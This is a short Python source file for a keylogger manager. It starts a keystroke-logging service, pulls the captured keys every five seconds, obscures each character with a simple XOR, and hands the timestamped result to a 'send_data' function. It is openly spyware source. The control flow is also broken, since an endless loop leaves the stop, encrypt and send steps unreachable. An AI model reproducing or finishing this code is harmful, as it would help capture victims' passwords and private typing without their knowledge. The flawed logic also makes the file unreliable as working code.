import datetime
import time
from KeyloggerService import service
from Encryption_file import encryptor
from FileWriter import file_writer
class KeyLoggerManager:
    def __init__(self):
        self.buffer = []
        self.to_encrypt = []


    def manager(self):
        service.start_logging()
        while True:
            self.buffer = service.get_logged_keys()
            time.sleep(5)

        service.stop_logging()
        for char in self.buffer:
            self.to_encrypt.append(encryptor.ascii_xor(char))
        file_writer.send_data({str(datetime.datetime.now()): self.to_encrypt},"15:02:45")





